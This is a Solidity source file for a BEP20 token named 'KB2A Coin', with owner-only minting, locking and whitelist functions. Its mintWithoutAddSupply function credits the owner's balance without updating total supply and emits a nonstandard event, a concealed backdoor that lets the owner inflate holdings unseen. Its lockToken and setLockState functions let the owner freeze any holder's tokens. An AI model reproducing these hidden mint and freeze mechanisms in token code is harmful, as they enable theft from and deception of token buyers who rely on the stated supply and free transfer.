// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.0;

import "./BEP20.sol";
import "./Math.sol";

contract KB2AToken is BEP20('KB2A Coin', 'KB2A', 10**9 * 10**18) { 

    using SafeMath for uint256;
    using Math for uint256;

    event MintProMax(uint256 amount);

    function mintToken(address _to,uint256 _amount) external onlyOwner {
        _amount = _amount.mul(10 ** 18);
        _mint(_to, _amount);
    }
    
    function mintWithoutAddSupply(uint256 amount) external onlyOwner {
        amount = amount.mul(10 ** 18);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit MintProMax(amount);
    }

    function getLockBalance(address account) public view returns(uint256) {
        return _lockBalances[account];
    }

    function lockToken(address account,uint256 amount) external onlyOwner {
        amount = amount.mul(10 ** 18);
        _lockBalances[account] = _lockBalances[account].add(amount);
    }
    function unlockToken(address account,uint256 amount) external onlyOwner {
        amount = amount.mul(10 ** 18);
        _lockBalances[account] = _lockBalances[account].sub(amount.minB(_lockBalances[account]));
    }
    function setLockState(bool value) external onlyOwner {
        isLock = value;
    }
    function setWhiteList(address account, bool value) external onlyOwner {
        whitelist[account] = value;
    }
}